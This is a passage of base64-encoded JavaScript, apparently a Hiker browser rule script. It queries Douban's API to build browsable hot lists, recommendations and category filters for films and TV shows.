0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/or7fmraPnoa7ovpPlhaUnXFxyXFxuICAgICAgICAgICAgfVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvXFxcIiArIHRlbXAuaXRlbSArIFxcXCIvcmVjb21tZW5kXFxcIiArICc/cGxheWFibGU9JyArIHRlbXAucGxheWFibGUgKyAnJnNjb3JlX3JhbmdlPScgKyB0ZW1wLnNjb3JlICsgKHBhZ2UgPyBcXFwiJnN0YXJ0PVxcXCIgKyAocGFnZSAtIDEpICogY291bnQgKyBcXFwiJmNvdW50PVxcXCIgKyBjb3VudCA6IFxcXCImc3RhcnQ9MCZjb3VudD04XFxcIikpO1xcclxcbiAgICBsZXQgbCA9IHMuaXRlbXM7XFxyXFxuICAgIGwgPSBsLmZpbHRlcihlID0+IGUudHlwZSAhPT0gXFxcImFkXFxcIiAmJiBlLnR5cGUgIT09IFxcXCJ0YWdzXFxcIik7XFxyXFxuXFxyXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcclxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXHJcXG4gICAgICAgIGxldCB0eXBlID0gZS50eXBlLFxcclxcbiAgICAgICAgICAgIGlkID0gZS5pZCxcXHJcXG4gICAgICAgICAgICB0aXRsZSA9IGUuc3VidGl0bGUgfHwgZS50aXRsZTtcXHJcXG4gICAgICAgIGxldCBiYXNlVXJsID0gZS50eXBlID09PSBcXFwicGxheWxpc3RcXFwiID8gJ2hpa2VyOi8vZW1wdHkvJHBhZ2V7ZnlwYWdlfScgOiAnaGlrZXI6Ly9lbXB0eSNpbW1lcnNpdmVUaGVtZSMnO1xcclxcbiAgICAgICAgbGV0IHVzZUNvbmZpZyA9IGRldGFpbHNWaWV3Q29uZmlnc1tkZXRhaWxzVmlld0NvbmZpZ3MudXNlXS5jb25maWc7XFxyXFxuICAgICAgICBsZXQgdXJsUGFyYW1zID0ge307XFxyXFxuICAgICAgICBpZiAodXNlQ29uZmlnLnN0YXJ0c1dpdGgoJ3snKSkge1xcclxcbiAgICAgICAgICAgIGV2YWwoJ3VybFBhcmFtcyA9ICcgKyB1c2VDb25maWcpO1xcclxcbiAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICB1cmxQYXJhbXMudXJsID0gJChiYXNlVXJsICsgXFxcIiNub0hpc3RvcnkjXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9LCB0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICByZXR1cm4ge1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0aXRsZSArICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiID8gXFxcIlxcXCIgOiBcXFwi77yIXFxcIiArIGUueWVhciArIFxcXCLvvIlcXFwiKSxcXHJcXG4gICAgICAgICAgICB1cmw6IHVybFBhcmFtcy51cmwsXFxyXFxuICAgICAgICAgICAgZXh0cmE6IHVybFBhcmFtcy5leHRyYSxcXHJcXG4gICAgICAgICAgICBpbWc6IGUucGljID8gZS5waWMubm9ybWFsICsgXFxcIkBSZWZlcmVyPVxcXCIgKyBlLnBpYy5ub3JtYWwgOiBlLmNvdmVyX3VybCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5jb3Zlcl91cmwsXFxyXFxuICAgICAgICAgICAgZGVzYzogZS50eXBlICE9PSBcXFwicGxheWxpc3RcXFwiID8gKGUudGFncy5tYXAoKGUgPT4gZS5uYW1lKSkuam9pbihcXFwiLFxcXCIpICsgXFxcIlxcXFxuXFxcIiArIChlLnJhdGluZyA/IGNvbXB1dGVSYXRpbmcoZS5yYXRpbmcubWF4LCBlLnJhdGluZy52YWx1ZSkgKyBcXFwiIFxcXCIgKyBlLnJhdGluZy52YWx1ZS50b0ZpeGVkKDEpICsgXFxcIuWIhlxcXCIgOiBcXFwi5pqC5peg6K+E5YiGXFxcIikpIDogKGUudGl0bGUgKyBcXFwiXFxcXG5cXFwiICsgZS50YWdzLmpvaW4oXFxcIixcXFwiKSArIFxcXCJcXFxcbuWFsVxcXCIgKyBlLml0ZW1zX2NvdW50ICsgXFxcIumDqFxcXCIpXFxyXFxuICAgICAgICB9XFxyXFxuICAgIH0pKTtcXHJcXG5cXHJcXG4gICAgcmV0dXJuIHBhZ2UgPiAxID8gaSA6IGEuY29uY2F0KGkpO1xcclxcbn1cXHJcXG5cXHJcXG4vL+eDremXqFxcclxcbmZ1bmN0aW9uIGhvdExpc3QocGFnZSwgY291bnQpIHtcXHJcXG4gICAgaWYgKCFnZXRNeVZhcignaG90TGlzdCcpKSBwdXRNeVZhcignaG90TGlzdCcsICd7XFxcIml0ZW1cXFwiOlxcXCJtb3ZpZV9zaG93aW5nP2FyZWE95YWo6YOoXFxcIixcXFwicGxheWFibGVcXFwiOlxcXCIwXFxcIixcXFwic29ydFxcXCI6XFxcInJlY29tbWVuZFxcXCIsXFxcInNjb3JlXFxcIjpcXFwiMCwxMFxcXCJ9Jyk7XFxyXFxuICAgIGxldCBhID0gW107XFxyXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignaG90TGlzdCcpKTtcXHJcXG4gICAgbGV0IGNvbG9yID0gZ2V0Q29uZmlnKCdjaG9vc2VDb2xvcicpO1xcclxcblxcclxcbiAgICBsZXQgaXRlbXMgPSB7XFxyXFxuICAgICAgICDnlLXlvbE6IHtcXHJcXG4gICAgICAgICAgICDlvbHpmaLng63mmKDnlLXlvbE6ICdtb3ZpZV9zaG93aW5nP2FyZWE95YWo6YOoJyxcXHJcXG4gICAgICAgICAgICDosYbnk6Png63pl6jnlLXlvbE6ICdob3RfZ2FpYT9hcmVhPeWFqOmDqCcsXFxyXFxuICAgICAgICAgICAg54Ot6Zeo5Y2O6K+t55S15b2xOiAnaG90X2dhaWE/YXJlYT3ljY7or60nLFxcclxcbiAgICAgICAgICAgIOeDremXqOasp+e+jueUteW9sTogJ2hvdF9nYWlhP2FyZWE95qyn576OJyxcXHJcXG4gICAgICAgICAgICDng63pl6jpn6nlm73nlLXlvbE6ICdob3RfZ2FpYT9hcmVhPemfqeWbvScsXFxyXFxuICAgICAgICAgICAg54Ot6Zeo5pel5pys55S15b2xOiAnaG90X2dhaWE/YXJlYT3ml6XmnKwnXFxyXFxuICAgICAgICB9LFxcclxcbiAgICAgICAg55S16KeG5YmnOiB7XFxyXFxuICAgICAgICAgICAg54Ot5pKt55S16KeG5YmnOiAndHZfaG90JyxcXHJcXG4gICAgICAgICAgICDng63mkq3lm73kuqfliac6ICd0dl9kb21lc3RpYycsXFxyXFxuICAgICAgICAgICAg54Ot5pKt5qyn576O5YmnOiAndHZfYW1lcmljYW4nLFxcclxcbiAgICAgICAgICAgIOeDreaSreaXpeWJpzogJ3R2X2phcGFuZXNlJyxcXHJcXG4gICAgICAgICAgICDng63mkq3pn6nliac6ICd0dl9rb3JlYW4nLFxcclxcbiAgICAgICAgICAgIOeDreaSreWKqOeUuzogJ3R2X2FuaW1hdGlvbidcXHJcXG4gICAgICAgIH0sXFxyXFxuICAgICAgICDnu7zoibo6IHtcXHJcXG4gICAgICAgICAgICDng63mkq3nu7zoibo6ICdzaG93X2hvdCcsXFxyXFxuICAgICAgICAgICAg5Zu95YaF57u86Im6OiAnc2hvd19kb21lc3RpYycsXFxyXFxuICAgICAgICAgICAg5Zu95aSW57u86Im6OiAnc2hvd19mb3JlaWduJ1xcclxcbiAgICAgICAgfVxcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IGkgaW4gaXRlbXMpIHtcXHJcXG4gICAgICAgIGZvciAobGV0IGogaW4gaXRlbXNbaV0pIHtcXHJcXG4gICAgICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZTogdGVtcC5pdGVtID09IGl0ZW1zW2ldW2pdID8gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBqICsgJyA8L2ZvbnQ+PC9iPicgOiBqLFxcclxcbiAgICAgICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOi8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2hvdExpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICB0ZW1wLml0ZW0gPSBlO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoJ2hvdExpc3QnLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgICAgICB9LCBpdGVtc1tpXVtqXSlcXHJcXG4gICAgICAgICAgICB9KVxcclxcbiAgICAgICAgfVxcclxcbiAgICAgICAgYS5wdXNoKHtcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcImJsYW5rX2Jsb2NrXFxcIlxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBsZXQgc29ydCA9IHtcXHJcXG4gICAgICAgIOeDreW6puaOkuW6jzogJ3JlY29tbWVuZCcsXFxyXFxuICAgICAgICDml7bpl7TmjpLluo86ICd0aW1lJyxcXHJcXG4gICAgICAgIOivhOWIhuaOkuW6jzogJ3JhbmsnXFxyXFxuICAgIH1cXHJcXG4gICAgZm9yIChsZXQgciBpbiBzb3J0KSB7XFxyXFxuICAgICAgICBhLnB1c2goe1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0ZW1wLnNvcnQgPT0gc29ydFtyXSA/ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz4nICsgciArICcgPC9mb250PjwvYj4nIDogcixcXHJcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcclxcbiAgICAgICAgICAgIHVybDogJCgnaGlrZXI6IC8vZW1wdHkjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChlKSA9PiB7XFxyXFxuICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignaG90TGlzdCcpKTtcXHJcXG4gICAgICAgICAgICAgICAgdGVtcC5zb3J0ID0gZTtcXHJcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcImhvdExpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxyXFxuICAgICAgICAgICAgICAgIHJldHVybiAnaGlrZXI6Ly9lbXB0eSdcXHJcXG4gICAgICAgICAgICB9LCBzb3J0W3JdKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJibGFua19ibG9ja1xcXCJcXHJcXG4gICAgfSlcXHJcXG5cXHJcXG4gICAgbGV0IHBsYXlhYmxlID0ge1xcclxcbiAgICAgICAg5YWo6YOo5b2x54mHOiAnMCcsXFxyXFxuICAgICAgICDku4XmnInniYfmupA6ICcxJ1xcclxcbiAgICB9XFxyXFxuICAgIGZvciAobGV0IHIgaW4gcGxheWFibGUpIHtcXHJcXG4gICAgICAgIGEucHVzaCh7XFxyXFxuICAgICAgICAgICAgdGl0bGU6IHRlbXAucGxheWFibGUgPT0gcGxheWFibGVbcl0gPyAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+JyArIHIgKyAnIDwvZm9udD48L2I+JyA6IHIsXFxyXFxuICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXHJcXG4gICAgICAgICAgICB1cmw6ICQoJ2hpa2VyOiAvL2VtcHR5I25vTG9hZGluZyMnKS5sYXp5UnVsZSgoZSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBsZXQgdGVtcCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoJ2hvdExpc3QnKSk7XFxyXFxuICAgICAgICAgICAgICAgIHRlbXAucGxheWFibGUgPSBlO1xcclxcbiAgICAgICAgICAgICAgICBwdXRNeVZhcihcXFwiaG90TGlzdFxcXCIsIEpTT04uc3RyaW5naWZ5KHRlbXApKTtcXHJcXG4gICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICdoaWtlcjovL2VtcHR5J1xcclxcbiAgICAgICAgICAgIH0sIHBsYXlhYmxlW3JdKVxcclxcbiAgICAgICAgfSlcXHJcXG4gICAgfVxcclxcblxcclxcbiAgICBhLnB1c2goe1xcclxcbiAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ08Yj4gPGZvbnQgY29sb3I9JyArIGNvbG9yICsgJz7or4TliIbljLrpl7Q6JyArIHRlbXAuc2NvcmUucmVwbGFjZSgnLCcsICctJykgKyAnIDwvZm9udD48L2I+JyxcXHJcXG4gICAgICAgIGNvbF90eXBlOiAnc2Nyb2xsX2J1dHRvbicsXFxyXFxuICAgICAgICB1cmw6ICQodGVtcC5zY29yZS5yZXBsYWNlKCcsJywgJy0nKSwgJ+ivhOWIhuW6lOWcqDAtMTDkuYvpl7QnKS5pbnB1dCgoKSA9PiB7XFxyXFxuICAgICAgICAgICAgbGV0IHRlbXAgPSBKU09OLnBhcnNlKGdldE15VmFyKCdob3RMaXN0JykpO1xcclxcbiAgICAgICAgICAgIGxldCBpbnB1dHMgPSBpbnB1dC5zcGxpdCgnLScpO1xcclxcbiAgICAgICAgICAgIGlmIChpbnB1dHMubGVuZ3RoID09IDIgJiYgaW5wdXRzLmV2ZXJ5KGUgPT4gZSA+PSAwICYmIGUgPD0gMTApICYmIHBhcnNlRmxvYXQoaW5wdXRzWzBdKSA8IGlucHV0c1sxXSkge1xcclxcbiAgICAgICAgICAgICAgICB0ZW1wLnNjb3JlID0gaW5wdXQucmVwbGFjZSgnLScsICcsJyk7XFxyXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJob3RMaXN0XFxcIiwgSlNPTi5zdHJpbmdpZnkodGVtcCkpO1xcclxcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcclxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgfSBlbHNlIHtcXHJcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+ivt+ato+ehrui+k+WFpSdcXHJcXG4gICAgICAgICAgICB9XFxyXFxuICAgICAgICB9KVxcclxcbiAgICB9KVxcclxcblxcclxcbiAgICBsZXQgbCA9IFtdO1xcclxcbiAgICBpZiAodGVtcC5pdGVtLmluZGV4T2YoJz8nKSAhPSAtMSkge1xcclxcbiAgICAgICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvbW92aWUvXFxcIiArIHRlbXAuaXRlbSArICcmcGxheWFibGU9JyArIHRlbXAucGxheWFibGUgKyAnJnNvcnQ9JyArIHRlbXAuc29ydCArICcmc2NvcmVfcmFuZ2U9JyArIHRlbXAuc2NvcmUgKyAocGFnZSA/IFxcXCImc3RhcnQ9XFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcIiZzdGFydD0wJmNvdW50PTMwXFxcIikgKyAnJmxvY19pZD0xMDgyODgnKTtcXHJcXG4gICAgICAgIGwgPSBzLml0ZW1zO1xcclxcbiAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgbGV0IHMgPSBnZXREb3ViYW5SZXMoXFxcImh0dHBzOi8vZnJvZG8uZG91YmFuLmNvbS9hcGkvdjIvc3ViamVjdF9jb2xsZWN0aW9uL1xcXCIgKyB0ZW1wLml0ZW0gKyAnL2l0ZW1zJyArICc/cGxheWFibGU9JyArIHRlbXAucGxheWFibGUgKyAnJnNvcnQ9JyArIHRlbXAuc29ydCArICcmc2NvcmVfcmFuZ2U9JyArIHRlbXAuc2NvcmUgKyAocGFnZSA/IFxcXCImc3RhcnQ9XFxcIiArIChwYWdlIC0gMSkgKiBjb3VudCArIFxcXCImY291bnQ9XFxcIiArIGNvdW50IDogXFxcIiZzdGFydD0wJmNvdW50PTMwXFxcIikpO1xcclxcbiAgICAgICAgbCA9IHMuc3ViamVjdF9jb2xsZWN0aW9uX2l0ZW1zO1xcclxcbiAgICB9XFxyXFxuXFxyXFxuICAgIGxldCBkZXRhaWxzVmlld0NvbmZpZ3MgPSBnZXRDb25maWcoJ2RldGFpbHNWaWV3Q29uZmlncycpO1xcclxcbiAgICBsZXQgaSA9IGwubWFwKChlID0+IHtcXHJcXG4gICAgICAgIGxldCB0eXBlID0gZS50eXBlLFxcclxcbiAgICAgICAgICAgIGlkID0gZS5pZCxcXHJcXG4gICAgICAgICAgICB0aXRsZSA9IGUudGl0bGU7XFxyXFxuICAgICAgICBsZXQgdXNlQ29uZmlnID0gZGV0YWlsc1ZpZXdDb25maWdzW2RldGFpbHNWaWV3Q29uZmlncy51c2VdLmNvbmZpZztcXHJcXG4gICAgICAgIGxldCB1cmxQYXJhbXMgPSB7fTtcXHJcXG4gICAgICAgIGlmICh1c2VDb25maWcuc3RhcnRzV2l0aCgneycpKSB7XFxyXFxuICAgICAgICAgICAgZXZhbCgndXJsUGFyYW1zID0gJyArIHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICB9IGVsc2Uge1xcclxcbiAgICAgICAgICAgIHVybFBhcmFtcy51cmwgPSAkKFxcXCJoaWtlcjovL2VtcHR5I25vSGlzdG9yeSMjaW1tZXJzaXZlVGhlbWUjXFxcIiArICc/dHlwZT0nICsgdHlwZSArICcmaWQ9JyArIGlkKS5ydWxlKCh0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZykgPT4ge1xcclxcbiAgICAgICAgICAgICAgICBldmFsKEpTT04ucGFyc2UocmVxdWVzdCgnaGlrZXI6Ly9wYWdlL21haW4nKSkucnVsZSk7XFxyXFxuICAgICAgICAgICAgICAgIGlmICh0eXBlID09PSBcXFwicGxheWxpc3RcXFwiKSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBkb3VMaXN0KGlkLCBNWV9QQUdFLCA1MCk7XFxyXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxyXFxuICAgICAgICAgICAgICAgICAgICBldmFsKHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICB9LCB0eXBlLCBpZCwgdGl0bGUsIHVzZUNvbmZpZyk7XFxyXFxuICAgICAgICB9XFxyXFxuICAgICAgICByZXR1cm4ge1xcclxcbiAgICAgICAgICAgIHRpdGxlOiB0aXRsZSArIFxcXCLvvIhcXFwiICsgZS55ZWFyICsgXFxcIu+8iVxcXCIsXFxyXFxuICAgICAgICAgICAgdXJsOiB1cmxQYXJhbXMudXJsLFxcclxcbiAgICAgICAgICAgIGV4dHJhOiB1cmxQYXJhbXMuZXh0cmEsXFxyXFxuICAgICAgICAgICAgaW1nOiBlLnBpYyA/IGUucGljLm5vcm1hbCArIFxcXCJAUmVmZXJlcj1cXFwiICsgZS5waWMubm9ybWFsIDogZS5jb3Zlci51cmwgKyAnQFJlZmVyZXI9JyArIGUuY292ZXIudXJsLFxcclxcbiAgICAgICAgICAgIGRlc2M6IChlLnRhZ3MgPyBlLnRhZ3MubWFwKChlID0+IGUubmFtZSkpLmpvaW4oXFxcIixcXFwiKSA6IGUuY2FyZF9zdWJ0aXRsZSkgKyBcXFwiXFxcXG5cXFwiICsgKGUucmF0aW5nID8gY29tcHV0ZVJhdGluZyhlLnJhdGluZy5tYXgsIGUucmF0aW5nLnZhbHVlKSArIFxcXCIgXFxcIiArIGUucmF0aW5nLnZhbHVlLnRvRml4ZWQoMSkgKyBcXFwi5YiGXFxcIiA6IFxcXCLmmoLml6Dor4TliIZcXFwiKVxcclxcbiAgICAgICAgfVxcclxcbiAgICB9KSk7XFxyXFxuXFxyXFxuICAgIHJldHVybiBwYWdlID4gMSA/IGkgOiBhLmNvbmNhdChpKTtcXHJcXG59XFxyXFxuXFxyXFxuLy/liIbnsbtcXHJcXG5mdW5jdGlvbiBjbGFzc0xpc3QocGFnZSwgY291bnQpIHtcXHJcXG4gICAgaWYgKCFnZXRNeVZhcignY2xhc3NsaXN0Jykpe1xcclxcbiAgICAgICAgcHV0TXlWYXIoJ2NsYXNzbGlzdCcsIEpTT04uc3RyaW5naWZ5KHtzdWJ0eXBlOlxcXCJcXFwiLGxvY2FsOlxcXCJcXFwiLHllYXI6XFxcIlxcXCIsY2xhc3M6XFxcIlxcXCIscmFuazpcXFwiVVxcXCIsdHlwZTpcXFwiXFxcIixmaWx0ZXI6XFxcIlxcXCIsc2NvcmU6XFxcIjAsMTBcXFwifSkpO1xcclxcbiAgICB9XFxyXFxuICAgIGxldCBhID0gW107XFxyXFxuICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcclxcbiAgICBsZXQgY29sb3IgPSBnZXRDb25maWcoJ2Nob29zZUNvbG9yJyk7XFxyXFxuXFxyXFxuICAgIGxldCBpdGVtcyA9IHtcXHJcXG4gICAgICAgIHN1YnR5cGU6IFtcXFwi5YWo6YOo5b2i5byPXFxcIiwgXFxcIueUteW9sVxcXCIsIFxcXCLnlLXop4bliadcXFwiLCBcXFwi57u86Im6XFxcIiwgXFxcIuWKqOa8q1xcXCIsIFxcXCLnuqrlvZXniYdcXFwiLCBcXFwi55+t54mHXFxcIl0sXFxyXFxuICAgICAgICBsb2NhbDogW1xcXCLlhajpg6jlnLDljLpcXFwiLCBcXFwi6Ieq5a6a5LmJ5Zyw5Yy6XFxcIiwgXFxcIuS4reWbveWkp+mZhlxcXCIsIFxcXCLnvo7lm71cXFwiLCBcXFwi5Lit5Zu96aaZ5rivXFxcIiwgXFxcIuS4reWbveWPsOa5vlxcXCIsIFxcXCLml6XmnKxcXFwiLCBcXFwi6Z+p5Zu9XFxcIiwgXFxcIuiLseWbvVxcXCIsIFxcXCLms5Xlm71cXFwiLCBcXFwi5b635Zu9XFxcIiwgXFxcIuaEj+Wkp+WIqVxcXCIsIFxcXCLopb/nj63niZlcXFwiLCBcXFwi5Y2w5bqmXFxcIiwgXFxcIuazsOWbvVxcXCIsIFxcXCLkv4TnvZfmlq9cXFwiLCBcXFwi5LyK5pyXXFxcIiwgXFxcIuWKoOaLv+Wkp1xcXCIsIFxcXCLmvrPlpKfliKnkuppcXFwiLCBcXFwi54ix5bCU5YWwXFxcIiwgXFxcIueRnuWFuFxcXCIsIFxcXCLlt7Topb9cXFwiLCBcXFwi5Li56bqmXFxcIl0sXFxyXFxuICAgICAgICB0eXBlOiBbXFxcIuWFqOmDqOexu+Wei1xcXCIsIFxcXCLoh6rlrprkuYnnsbvlnotcXFwiLCBcXFwi5Ymn5oOFXFxcIiwgXFxcIuWWnOWJp1xcXCIsIFxcXCLliqjkvZxcXFwiLCBcXFwi54ix5oOFXFxcIiwgXFxcIuenkeW5u1xcXCIsIFxcXCLliqjnlLtcXFwiLCBcXFwi5oKs55aRXFxcIiwgXFxcIuaDiuaCmlxcXCIsIFxcXCLmgZDmgJZcXFwiLCBcXFwi54qv572qXFxcIiwgXFxcIuWQjOaAp1xcXCIsIFxcXCLpn7PkuZBcXFwiLCBcXFwi5q2M6IieXFxcIiwgXFxcIuS8oOiusFxcXCIsIFxcXCLljoblj7JcXFwiLCBcXFwi5oiY5LqJXFxcIiwgXFxcIuilv+mDqFxcXCIsIFxcXCLlpYflubtcXFwiLCBcXFwi5YaS6ZmpXFxcIiwgXFxcIueBvumavlxcXCIsIFxcXCLmrabkvqBcXFwiLCBcXFwiXFxcXHU2MGM1XFxcXHU4MjcyXFxcIl0sXFxyXFxuICAgICAgICB5ZWFyOiBbXFxcIuWFqOmDqOW5tOS7o1xcXCIsIFxcXCLoh6rlrprkuYnlubTku71cXFwiLCBcXFwiMjAyMOW5tOS7o1xcXCIsIFxcXCIyMDEw5bm05LujXFxcIiwgXFxcIjIwMDDlubTku6NcXFwiLCBcXFwiOTDlubTku6NcXFwiLCBcXFwiODDlubTku6NcXFwiLCBcXFwiNzDlubTku6NcXFwiLCBcXFwiNjDlubTku6NcXFwiLCBcXFwi5pu05pepXFxcIl0sXFxyXFxuICAgICAgICBjbGFzczogW1xcXCLlhajpg6jnibnoibJcXFwiLCBcXFwi6Ieq5a6a5LmJ5qCH562+XFxcIiwgXFxcIue7j+WFuFxcXCIsIFxcXCLpnZLmmKVcXFwiLCBcXFwi5paH6Im6XFxcIiwgXFxcIuaQnueskVxcXCIsIFxcXCLlirHlv5dcXFwiLCBcXFwi6a2U5bm7XFxcIiwgXFxcIuaEn+S6ulxcXCIsIFxcXCLlpbPmgKdcXFwiLCBcXFwi6buR5biuXFxcIiwgXFxcIuayu+aEiFxcXCIsIFxcXCLnvo7po59cXFwiLCBcXFwi5a6X5pWZXFxcIiwgXFxcIuWwj+ivtOaUuee8llxcXCIsIFxcXCLotoXnuqfoi7Hpm4RcXFwiXVxcclxcbiAgICB9XFxyXFxuICAgIGZvciAoaXRlbSBpbiBpdGVtcykge1xcclxcbiAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBpdGVtc1tpdGVtXS5sZW5ndGg7IGkrKykge1xcclxcbiAgICAgICAgICAgIGxldCB0aXRsZSA9IFxcXCJcXFwiO1xcclxcbiAgICAgICAgICAgIGlmKHRlbXBbaXRlbV0gPT0gaXRlbXNbaXRlbV1baV0gfHwgKHRlbXBbaXRlbV0gPT0gXFxcIlxcXCIgJiYgaSA9PSAwKSl7XFxyXFxuICAgICAgICAgICAgICAgIHRpdGxlID0gJ+KAnOKAnOKAneKAnTxiPiA8Zm9udCBjb2xvcj0nICsgY29sb3IgKyAnPicgKyBpdGVtc1tpdGVtXVtpXSArICcgPC9mb250PjwvYj4nO1xcclxcbiAgICAgICAgICAgIH1lbHNle1xcclxcbiAgICAgICAgICAgICAgICB0aXRsZSA9IGl0ZW1zW2l0ZW1dW2ldO1xcclxcbiAgICAgICAgICAgIH1cXHJcXG4gICAgICAgICAgICBsZXQgdXJsID0gJCgnaGlrZXI6Ly9lbXB0eSNub0xvYWRpbmcjJykubGF6eVJ1bGUoKHRleHQsaXRlbSkgPT4ge1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCB0ZW1wID0gSlNPTi5wYXJzZShnZXRNeVZhcignY2xhc3NsaXN0JykpO1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBbaXRlbV0gPSB0ZXh0LmluZGV4T2YoXFxcIuWFqOmDqFxcXCIpICE9IC0xID8gXFxcIlxcXCIgOiB0ZXh0O1xcclxcbiAgICAgICAgICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXCJjbGFzc2xpc3RcXFwiLCBKU09OLnN0cmluZ2lmeSh0ZW1wKSk7XFxyXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmVmcmVzaFBhZ2UoKTtcXHJcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vZW1wdHknXFxyXFxuICAgICAgICAgICAgICAgICAgICB9LCBpdGVtc1tpdGVtXVtpXSwgaXRlbSk7XFxyXFxuICAgICAgICAgICAgXFxyXFxuICAgICAgICAgICAgaWYoaXRlbXNbaXRlbV1baV0gPT0gXFxcIuiHquWumuS5ieW5tOS7vVxcXCIpe1xcclxcbiAgICAgICAgICAgICAgICBpZih0ZW1wLnllYXIgPT0gXFxcIuiHquWumuS5ieW5tOS7vVxcXCIpe1xcclxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGUgPSAn4oCc4oCc4oCd4oCdPGI+IDxmb250IGNvbG9yPScgKyBjb2xvciArICc+6Ieq5a6a5LmJ5bm05Lu9OicgKyB0ZW1wLmN1c3RvbVllYXIgKyAnIDwvZm9